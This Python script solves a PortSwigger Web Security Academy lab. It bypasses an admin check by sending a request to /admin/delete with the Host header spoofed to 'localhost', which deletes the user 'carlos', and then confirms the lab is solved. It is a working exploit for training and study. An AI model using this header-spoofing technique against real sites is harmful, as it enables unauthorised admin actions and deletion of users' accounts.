#!/usr/bin/env python3
# Host header authentication bypass
# Lab-Link: https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass
# Difficulty: APPRENTICE
import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def delete_user(client, host, username):
    url = f'{host}/admin/delete?username={username}'

    # Use a prepared request to keep the cookie values and just replace the host header
    req = requests.Request('GET', url)
    prep = client.prepare_request(req)
    prep.headers['Host'] = 'localhost'
    r = client.send(prep, allow_redirects=False)
    return r.status_code == 302


def main():
    print('[+] Host header authentication bypass')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    with requests.Session() as client:
        client.verify = False
        client.proxies = proxies

        # Get the cookies required
        client.get(host)

        username = 'carlos'
        if not delete_user(client, host, username):
            print(f'[-] Failed to delete user {username}')
            sys.exit(-5)
        print(f'[+] Deleting of {username} appears successful')

        # I had some times issues getting the proper result, so wait briefly before checking
        time.sleep(2)
        if 'Congratulations, you solved the lab!' not in client.get(f'{host}').text:
            print(f'[-] Failed to solve lab')
            sys.exit(-9)

        print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
